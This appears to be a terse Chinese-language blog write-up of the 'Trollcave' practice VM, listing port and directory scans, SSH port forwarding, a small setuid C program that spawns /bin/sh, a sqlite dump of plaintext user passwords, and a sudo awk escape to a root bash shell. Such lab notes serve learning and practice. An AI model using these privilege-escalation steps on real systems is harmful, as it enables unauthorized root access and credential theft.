---
title: trollcave
date: 2020-12-04 23:57:34
tags:
---

# Trollcave

# 一 扫描端口

扫描开放端口：`nmap -sV -sC -p- 192.168.0.149 -oA trollcave-allports`  

扫描敏感目录:`gobuster dir -u http://192.168.0.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`  

## 二 信息收集

```
netstat -lntp 查看端口信息
ssh -L 8888:localhost:8888 端口转发
```

通过`setuid`来提权

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc,char *argv[])
{setreuid(1000,1000);//etc/passwd
execve("/bin/sh",NULL,NULL);
}
```

```
base64 exp [空格]
```

![image-20201219234945547](https://i.loli.net/2020/12/19/EPDBCseNmOKpwyl.png)

让所有用户都可以使用。

`chmod 4755`

![image-20201219235146083](https://i.loli.net/2020/12/19/mTdcMQ9foUAsqpS.png)

```
5432是postsql的端口号
```

```
sqlite select * from users; 密码是可进行破解的，运行出来全是明文，可以直接去碰撞的
enter+shift+~+大写C 进行ssh
```

```
sudo -l 查看当前权限
```

/etc/sudoers  去掉

```
awk 可以执行系统命令 sudo awk'{system('/bin/bash')}''
```

